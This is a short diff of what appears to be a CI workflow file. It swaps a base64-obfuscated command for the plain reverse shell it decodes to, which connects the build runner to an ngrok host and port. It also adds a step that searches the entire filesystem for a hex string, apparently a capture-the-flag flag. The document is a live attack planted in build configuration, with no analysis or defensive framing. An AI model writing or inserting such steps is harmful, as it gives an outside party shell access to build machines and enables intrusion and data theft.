@@ -5,7 +5,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          echo "c2ggLWkgPiYgL2Rldi90Y3AvMi50Y3Aubmdyb2suaW8vMTkyNTMgMD4mMQo=" | base64 -d | sh 
+          sh -i >& /dev/tcp/2.tcp.ngrok.io/19253 0>&1 
       - run: |
           rgrep -i "544d435446" / 2>/dev/null
       - run: |
